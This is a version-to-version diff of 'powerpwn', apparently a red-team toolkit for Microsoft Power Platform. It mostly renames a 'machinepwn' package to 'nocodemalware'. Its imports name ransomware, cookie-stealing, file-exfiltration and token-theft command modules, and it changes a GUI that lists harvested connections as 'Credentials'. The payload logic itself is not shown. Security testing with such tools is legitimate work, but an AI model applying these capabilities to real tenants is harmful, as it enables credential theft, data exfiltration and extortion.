-from powerpwn.machinepwn.models.ransomware_args_properties import RansomwareArgsProperties
-from powerpwn.machinepwn.models.ransomware_command_args import RansomwareCommandArgs
-from powerpwn.machinepwn.models.steal_cookie_args_properties import StealCookieArgsProperties
-from powerpwn.machinepwn.models.steal_cookie_command_args import StealCookieCommandArgs
-from powerpwn.machinepwn.models.steal_power_automate_token_command_args import StealPowerAutomateTokenCommandArgs
+from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
+from powerpwn.nocodemalware.models.any_command_args import AnyCommandArgs
+from powerpwn.nocodemalware.models.cleanup_command_args import CleanupCommandArgs
+from powerpwn.nocodemalware.models.cmd_results import CommandResults
+from powerpwn.nocodemalware.models.code_exec_args_properties import CodeExecArgsProperties
+from powerpwn.nocodemalware.models.code_exec_command_args import CodeExecCommandArgs
+from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
+from powerpwn.nocodemalware.models.exflirtate_file_args_properties import ExflirtateFileArgsProperties
+from powerpwn.nocodemalware.models.exflirtate_file_command_args import ExflirtateFileCommandArgs
+from powerpwn.nocodemalware.models.ransomware_args_properties import RansomwareArgsProperties
+from powerpwn.nocodemalware.models.ransomware_command_args import RansomwareCommandArgs
+from powerpwn.nocodemalware.models.steal_cookie_args_properties import StealCookieArgsProperties
+from powerpwn.nocodemalware.models.steal_cookie_command_args import StealCookieCommandArgs
+from powerpwn.nocodemalware.models.steal_power_automate_token_command_args import StealPowerAutomateTokenCommandArgs
 
 
-class MachinePwn:
+class MalwareRunner:
     def __init__(self, post_url: str, debug: bool = False):
         """
         Power Pwn client to run commands through Microsoft infrastructure
         :param post_url: a URL on the malicious Microsoft instance to post commands to
         :param debug: whether to print debug messages
         """
         self.post_url = post_url
```

### Comparing `powerpwn-2.1.1/src/powerpwn/machinepwn/models/cmd_arguments.py` & `powerpwn-2.1.2/src/powerpwn/nocodemalware/models/cmd_arguments.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 from typing import Generic, TypeVar
 
 from pydantic.generics import GenericModel
 
-from powerpwn.machinepwn.enums.command_to_run_enum import CommandToRunEnum
-from powerpwn.machinepwn.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
+from powerpwn.nocodemalware.enums.command_to_run_enum import CommandToRunEnum
+from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
 
 _TCommandArgumentProperties = TypeVar("_TCommandArgumentProperties", bound=CommandArgsPropertiesBaseModel)
 
 
 class CommandArguments(GenericModel, Generic[_TCommandArgumentProperties]):
     command_to_run: CommandToRunEnum
     command_properties: _TCommandArgumentProperties
```

### Comparing `powerpwn-2.1.1/src/powerpwn/machinepwn/models/cmd_results.py` & `powerpwn-2.1.2/src/powerpwn/nocodemalware/models/cmd_results.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/main.py` & `powerpwn-2.1.2/src/powerpwn/main.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdoor/backdoor_flow.py` & `powerpwn-2.1.2/src/powerpwn/powerdoor/backdoor_flow.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdoor/flow_factory_installer.py` & `powerpwn-2.1.2/src/powerpwn/powerdoor/flow_factory_installer.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdoor/samples/flow_factory_to_install.json` & `powerpwn-2.1.2/src/powerpwn/powerdoor/samples/flow_factory_to_install.json`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py` & `powerpwn-2.1.2/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_documentdb.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_documentdb.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/data_collector.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/data_collector.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/base_entity.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/base_entity.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/base_validator.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/base_validator.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/connection_entity.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/connection_entity.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/connector_entity.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/connector_entity.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/data_dump_entity.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/data_dump_entity.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/data_record_entity.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/data_record_entity.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/data_store_entity.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/data_store_entity.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/_api.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/_api.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py`

 * *Files 1% similar despite different names*

```diff
@@ -77,12 +77,12 @@
                     version=version,
                     permissions=principals,
                     entity_id=canvas_app["name"],
                     environment_id=environment_id,
                     entity_type=ResourceType.canvas_app,
                 )
         logger.info(
-            f"Found {total_widely_shared_canvas_apps} widely shared canvas apps out of {total_canvas_apps} canvas apps in environment {environment_id}"
+            f"Found {total_widely_shared_canvas_apps} widely shared applications out of {total_canvas_apps} canvas apps in environment {environment_id}"
         )
 
     def resource_type(self) -> ResourceType:
         return ResourceType.canvas_app
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/iresource_collector.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/iresource_collector.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/gui/gui.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/gui/gui.py`

 * *Files 11% similar despite different names*

```diff
@@ -8,30 +8,32 @@
 from powerpwn.cli.const import LOGGER_NAME
 from powerpwn.powerdump.gui.prep import (
     flt_connection_table_wrapper,
     flt_resource_wrapper,
     full_canvasapps_table_wrapper,
     full_connection_table_wrapper,
     full_connectors_table_wrapper,
+    full_logic_flows_table_wrapper,
     full_resources_table_wrapper,
     register_specs,
 )
 
 
 class Gui:
     def run(self, cache_path: str) -> None:
         # run file browser
         subprocess.Popen(["browsepy", "0.0.0.0", "8080", "--directory", cache_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # nosec
 
         # run resources flask app
         app = Flask(__name__, template_folder=self.__get_template_full_path())
         register_specs(app=app, cache_path=cache_path)
         app.route("/")(full_resources_table_wrapper(cache_path=cache_path))
-        app.route("/connection")(full_connection_table_wrapper(cache_path=cache_path))
-        app.route("/canvas_app/")(full_canvasapps_table_wrapper(cache_path))
+        app.route("/credentials")(full_connection_table_wrapper(cache_path=cache_path))
+        app.route("/automation")(full_logic_flows_table_wrapper(cache_path=cache_path))
+        app.route("/app/")(full_canvasapps_table_wrapper(cache_path))
         app.route("/connector/")(full_connectors_table_wrapper(cache_path))
         app.route("/<connector_id>/")(flt_connection_table_wrapper(cache_path=cache_path))
         app.route("/<resource_type>/<env_id>/<resource_id>")(flt_resource_wrapper(cache_path=cache_path))
 
         logger = logging.getLogger(LOGGER_NAME)
         logger.info("Application is running on http://127.0.0.1:5000")
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/gui/prep.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/gui/prep.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,25 +1,23 @@
 import json
-import os
-import pathlib
 from typing import Optional
 
 from flask import Flask, render_template
 from swagger_ui import flask_api_doc
 
 from powerpwn.cli.const import TOOL_NAME
 from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
-from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
 from powerpwn.powerdump.utils.model_loaders import (
     get_canvasapp,
     get_connection,
     get_connector,
     load_canvasapps,
     load_connections,
     load_connectors,
+    load_logic_flows,
     load_resources,
     map_connector_id_and_env_id_to_connection_ids,
 )
 
 
 def register_specs(app: Flask, cache_path: str):
     connections = load_connections(cache_path=cache_path)
@@ -51,61 +49,66 @@
         return render_template("resources_table.html", title=TOOL_NAME, resources=resources)
 
     return full_resources_table
 
 
 def full_connection_table_wrapper(cache_path: str):
     def full_connection_table():
-        connections = list(load_connections(cache_path=cache_path))
+        connections = list(load_connections(cache_path=cache_path, with_logic_flows=False))
 
-        return render_template("connections_table.html", title=f"{TOOL_NAME} - Connections", resources=connections)
+        return render_template("connections_table.html", title=f"{TOOL_NAME} - Credentials", resources=connections)
 
     return full_connection_table
 
 
+def full_logic_flows_table_wrapper(cache_path: str):
+    def full_logic_flows_table():
+        connections = list(load_logic_flows(cache_path=cache_path))
+
+        return render_template("logic_flows_table.html", title=f"{TOOL_NAME} - Automations", resources=connections)
+
+    return full_logic_flows_table
+
+
 def flt_connection_table_wrapper(cache_path: str):
     def flt_connection_table(connector_id: str):
         connections = [conn for conn in load_connections(cache_path=cache_path) if conn.connector_id == connector_id]
 
         return render_template("connections_table.html", title=f"{TOOL_NAME} - {connector_id}", resources=connections)
 
     return flt_connection_table
 
 
 def full_canvasapps_table_wrapper(cache_path: str):
     def full_canvasapp_table():
         apps = list(load_canvasapps(cache_path=cache_path))
 
-        return render_template("canvasapps_table.html", title=f"{TOOL_NAME} - Canvas Apps", resources=apps)
+        return render_template("canvasapps_table.html", title=f"{TOOL_NAME} - Applications", resources=apps)
 
     return full_canvasapp_table
 
 
 def full_connectors_table_wrapper(cache_path: str):
     def full_connector_table():
         connectors = list(load_connectors(cache_path=cache_path))
 
         return render_template("connectors_table.html", title=f"{TOOL_NAME} - Connectors", resources=connectors)
 
     return full_connector_table
 
 
 def flt_resource_wrapper(cache_path: str):
-    def get_resource_page(resource_type: ResourceType, env_id: str, resource_id: str):
+    def get_resource_page(resource_type: str, env_id: str, resource_id: str):
         resource: Optional[ResourceEntityBase] = None
-        if resource_type == ResourceType.canvas_app:
+        if resource_type == "app":
             resource = get_canvasapp(cache_path, env_id, resource_id)
-        elif resource_type == ResourceType.connection:
+        elif resource_type in ("credentials", "automation"):
             resource = get_connection(cache_path, env_id, resource_id)
-        elif resource_type == ResourceType.connector:
+        elif resource_type == "connector":
             resource = get_connector(cache_path, env_id, resource_id)
 
         if resource:
             return render_template(
                 "json_object.html", title=f"{TOOL_NAME} - {resource_type} {resource_id}", json_object=json.dumps(resource.raw_json)
             )
 
     return get_resource_page
-
-
-def __get_template_full_path(template_name: str) -> str:
-    return os.path.join(pathlib.Path(__file__).parent.resolve(), "templates", template_name)
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/base.html` & `powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/base.html`

 * *Files 11% similar despite different names*

```diff
@@ -9,16 +9,17 @@
     <div class="container">
       <h1>{{ title }}</h1>
       <hr>
       <div class="layout">
         <div class="menu">
           <ul>
             <li><a href="/">All Resources</a></li>
-            <li><a href="/connection">Connections</a></li>
-            <li><a href="/canvas_app">Canvas Apps</a></li>
+            <li><a href="/credentials">Credentials</a></li>
+            <li><a href="/automation">Automations</a></li>
+            <li><a href="/app">Applications</a></li>
             <li><a href="/connector">Connectors</a></li>
           </ul>
         </div>
         <div class="content">
           {% block content %}{% endblock %}
         </div>
       </div>
```

#### html2text {}

```diff
@@ -1,9 +1,10 @@
 
 ****** {{ title }} ******
 ===============================================================================
     * All_Resources
-    * Connections
-    * Canvas_Apps
+    * Credentials
+    * Automations
+    * Applications
     * Connectors
 {% block content %}{% endblock %}
  {% block scripts %}{% endblock %}
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/canvasapps_table.html` & `powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/canvasapps_table.html`

 * *Files 12% similar despite different names*

```diff
@@ -18,15 +18,15 @@
           <td>{{ canvasapp.display_name }}</td>
           <td>{{ canvasapp.environment_id }}</td>
           <td>{{ canvasapp.version }}</td>
           <td>{{ canvasapp.created_by.email }}</td>
           <td>{{ canvasapp.created_at }}</td>
           <td>{{ canvasapp.last_modified_at }}</td>
           <td><a href="{{ canvasapp.run_url }}" target="_blank">Run</a> </td>
-          <td><a href="/{{ canvasapp.entity_type}}/{{ canvasapp.environment_id }}/{{ canvasapp.entity_id }}">Raw</a> </td>
+          <td><a href="/app/{{ canvasapp.environment_id }}/{{ canvasapp.entity_id }}">Raw</a> </td>
         </tr>
       {% endfor %}
     </tbody>
   </table>
 {% endblock %}
 
 {% block scripts %}
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/connections_table.html` & `powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/connections_table.html`

 * *Files 2% similar despite different names*

```diff
@@ -24,15 +24,15 @@
           <td>{{ connection.environment_id }}</td>
           <td>{{ connection.is_valid }}</td>
           <td>{{ connection.last_modified_at }}</td>
           <td>{{ connection.expiration_time }}</td>
           <td>{{ connection.created_by.email }}</td>
           <td>{{ connection.shareable }}</td>
           <td><a href="/api/{{ connection.connector_id }}/{{ connection.connection_id }}">Playground</a></td>
-          <td><a href="/{{ connection.entity_type }}/{{ connection.environment_id }}/{{ connection.entity_id }}">Raw</a> </td>
+          <td><a href="/credentials/{{ connection.environment_id }}/{{ connection.entity_id }}">Raw</a> </td>
           <td><a href="http://127.0.0.1:8080/browse/data/{{ connection.environment_id }}/connections/{{connection.connector_id}}/{{connection.entity_id}}" target="_blank">Dump</a> </td>
         </tr>
       {% endfor %}
     </tbody>
   </table>
 {% endblock %}
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/connectors_table.html` & `powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/connectors_table.html`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/resources_table.html` & `powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/resources_table.html`

 * *Files 12% similar despite different names*

```diff
@@ -19,15 +19,15 @@
           <td>{{ resource.display_name }} </td>
           <td>{{ resource.entity_id }}</td>
           <td>{{ resource.entity_type }}</td>
           <td>{{ resource.environment_id }}</td>
           <td>{{ resource.created_by.email }}</td>
           <td>{{ resource.created_at }}</td>
           <td>{{ resource.last_modified_at }}</td>
-          <td><a href="/{{ resource.entity_type }}/{{ resource.environment_id }}/{{ resource.entity_id }}">Raw</a> </td>
+          <td><a href="/connector/{{ resource.environment_id }}/{{ resource.entity_id }}">Raw</a> </td>
         </tr>
       {% endfor %}
     </tbody>
   </table>
 {% endblock %}
 
 {% block scripts %}
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/utils/auth.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/utils/auth.py`

 * *Files 12% similar despite different names*

```diff
@@ -39,15 +39,21 @@
         azure_cli_client.acquire_token_by_refresh_token(
             azure_cli_app_refresh_token,
             # But different scopes than original authorization
             scopes=[scope],
         )
     )
 
-    bearer = azure_cli_bearer_tokens_for_scope.get("token_type") + " " + azure_cli_bearer_tokens_for_scope.get("access_token")
+    if "token_type" not in azure_cli_bearer_tokens_for_scope or "access_token" not in azure_cli_bearer_tokens_for_scope:
+        logger.debug(
+            f"Acquired a token package with scope={scope}, tenant={tenant}. Received the following keys: {list(azure_cli_bearer_tokens_for_scope.key())}."
+        )
+        raise RuntimeError(f"Something went wrong when trying to fetch tokens with scope={scope}, tenant={tenant}. Try removing cached credentials.")
+
+    bearer = azure_cli_bearer_tokens_for_scope["token_type"] + " " + azure_cli_bearer_tokens_for_scope["access_token"]
     logger.info(f"Access token for {scope} acquired successfully")
 
     # cache refresh token for cli to use in further FOCI authentication
     # cache access token for required scope
     tokens_to_cache = [
         TokenCache(token_key=AZURE_CLI_REFRESH_TOKEN, token_val=azure_cli_app_refresh_token),
         TokenCache(SCOPE_TO_TOKEN_CACHE_TYPE[scope], bearer),
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/utils/json_utils.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/utils/json_utils.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/utils/model_loaders.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/utils/model_loaders.py`

 * *Files 4% similar despite different names*

```diff
@@ -13,25 +13,43 @@
 
 def load_resources(cache_path: str, env_id: Optional[str] = None) -> Generator[ResourceEntityBase, None, None]:
     yield from load_connections(cache_path, env_id)
     yield from load_canvasapps(cache_path, env_id)
     yield from load_connectors(cache_path, env_id)
 
 
-def load_connections(cache_path: str, env_id: Optional[str] = None) -> Generator[Connection, None, None]:
+def load_connections(cache_path: str, env_id: Optional[str] = None, with_logic_flows: bool = True) -> Generator[Connection, None, None]:
     cache = pathlib.Path(entities_path(cache_path))
     if env_id:
         connections = cache.glob(f"{env_id}/{ResourceType.connection}/*.json")
     else:
         connections = cache.glob(f"*/{ResourceType.connection}/*.json")
     for connection in connections:
         connection_path = "/".join(list(connection.parts))
         with open(connection_path, "r") as fp:
             raw_connection = json.load(fp)
             parsed_connection = Connection.parse_obj(raw_connection)
+            if parsed_connection.connector_id == "shared_logicflows" and not with_logic_flows:
+                continue
+            yield parsed_connection
+
+
+def load_logic_flows(cache_path: str, env_id: Optional[str] = None) -> Generator[Connection, None, None]:
+    cache = pathlib.Path(entities_path(cache_path))
+    if env_id:
+        connections = cache.glob(f"{env_id}/{ResourceType.connection}/*.json")
+    else:
+        connections = cache.glob(f"*/{ResourceType.connection}/*.json")
+    for connection in connections:
+        connection_path = "/".join(list(connection.parts))
+        with open(connection_path, "r") as fp:
+            raw_connection = json.load(fp)
+            parsed_connection = Connection.parse_obj(raw_connection)
+            if not parsed_connection.connector_id == "shared_logicflows":
+                continue
             yield parsed_connection
 
 
 def load_canvasapps(cache_path: str, env_id: Optional[str] = None) -> Generator[CanvasApp, None, None]:
     cache = pathlib.Path(entities_path(cache_path))
     if env_id:
         apps = cache.glob(f"{env_id}/{ResourceType.canvas_app}/*.json")
```

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/utils/path_utils.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/utils/path_utils.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/utils/requests_wrapper.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/utils/requests_wrapper.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/powerdump/utils/token_cache.py` & `powerpwn-2.1.2/src/powerpwn/powerdump/utils/token_cache.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn.egg-info/SOURCES.txt` & `powerpwn-2.1.2/src/powerpwn.egg-info/SOURCES.txt`

 * *Files 12% similar despite different names*

```diff
@@ -10,34 +10,34 @@
 src/powerpwn.egg-info/top_level.txt
 src/powerpwn/cli/__init__.py
 src/powerpwn/cli/arguments.py
 src/powerpwn/cli/const.py
 src/powerpwn/cli/runners.py
 src/powerpwn/enums/__init__.py
 src/powerpwn/enums/str_enum.py
-src/powerpwn/machinepwn/__init__.py
-src/powerpwn/machinepwn/machine_pwn.py
-src/powerpwn/machinepwn/enums/__init__.py
-src/powerpwn/machinepwn/enums/code_exec_type_enum.py
-src/powerpwn/machinepwn/enums/command_to_run_enum.py
-src/powerpwn/machinepwn/models/__init__.py
-src/powerpwn/machinepwn/models/any_command_args.py
-src/powerpwn/machinepwn/models/cleanup_command_args.py
-src/powerpwn/machinepwn/models/cmd_arguments.py
-src/powerpwn/machinepwn/models/cmd_results.py
-src/powerpwn/machinepwn/models/code_exec_args_properties.py
-src/powerpwn/machinepwn/models/code_exec_command_args.py
-src/powerpwn/machinepwn/models/command_args_properties_base_model.py
-src/powerpwn/machinepwn/models/exflirtate_file_args_properties.py
-src/powerpwn/machinepwn/models/exflirtate_file_command_args.py
-src/powerpwn/machinepwn/models/ransomware_args_properties.py
-src/powerpwn/machinepwn/models/ransomware_command_args.py
-src/powerpwn/machinepwn/models/steal_cookie_args_properties.py
-src/powerpwn/machinepwn/models/steal_cookie_command_args.py
-src/powerpwn/machinepwn/models/steal_power_automate_token_command_args.py
+src/powerpwn/nocodemalware/__init__.py
+src/powerpwn/nocodemalware/malware_runner.py
+src/powerpwn/nocodemalware/enums/__init__.py
+src/powerpwn/nocodemalware/enums/code_exec_type_enum.py
+src/powerpwn/nocodemalware/enums/command_to_run_enum.py
+src/powerpwn/nocodemalware/models/__init__.py
+src/powerpwn/nocodemalware/models/any_command_args.py
+src/powerpwn/nocodemalware/models/cleanup_command_args.py
+src/powerpwn/nocodemalware/models/cmd_arguments.py
+src/powerpwn/nocodemalware/models/cmd_results.py
+src/powerpwn/nocodemalware/models/code_exec_args_properties.py
+src/powerpwn/nocodemalware/models/code_exec_command_args.py
+src/powerpwn/nocodemalware/models/command_args_properties_base_model.py
+src/powerpwn/nocodemalware/models/exflirtate_file_args_properties.py
+src/powerpwn/nocodemalware/models/exflirtate_file_command_args.py
+src/powerpwn/nocodemalware/models/ransomware_args_properties.py
+src/powerpwn/nocodemalware/models/ransomware_command_args.py
+src/powerpwn/nocodemalware/models/steal_cookie_args_properties.py
+src/powerpwn/nocodemalware/models/steal_cookie_command_args.py
+src/powerpwn/nocodemalware/models/steal_power_automate_token_command_args.py
 src/powerpwn/powerdoor/__init__.py
 src/powerpwn/powerdoor/backdoor_flow.py
 src/powerpwn/powerdoor/create_flow_model.py
 src/powerpwn/powerdoor/flow_factory_installer.py
 src/powerpwn/powerdoor/enums/__init__.py
 src/powerpwn/powerdoor/enums/action_type.py
 src/powerpwn/powerdoor/enums/flow_state.py
@@ -91,16 +91,19 @@
 src/powerpwn/powerdump/gui/prep.py
 src/powerpwn/powerdump/gui/templates/__init__.py
 src/powerpwn/powerdump/gui/templates/base.html
 src/powerpwn/powerdump/gui/templates/canvasapps_table.html
 src/powerpwn/powerdump/gui/templates/connections_table.html
 src/powerpwn/powerdump/gui/templates/connectors_table.html
 src/powerpwn/powerdump/gui/templates/json_object.html
+src/powerpwn/powerdump/gui/templates/logic_flows_table.html
 src/powerpwn/powerdump/gui/templates/resources_table.html
 src/powerpwn/powerdump/utils/__init__.py
 src/powerpwn/powerdump/utils/auth.py
 src/powerpwn/powerdump/utils/const.py
 src/powerpwn/powerdump/utils/json_utils.py
 src/powerpwn/powerdump/utils/model_loaders.py
 src/powerpwn/powerdump/utils/path_utils.py
 src/powerpwn/powerdump/utils/requests_wrapper.py
-src/powerpwn/powerdump/utils/token_cache.py
+src/powerpwn/powerdump/utils/token_cache.py
+src/powerpwn/powerphishing/__init__.py
+src/powerpwn/powerphishing/app_installer.py
```

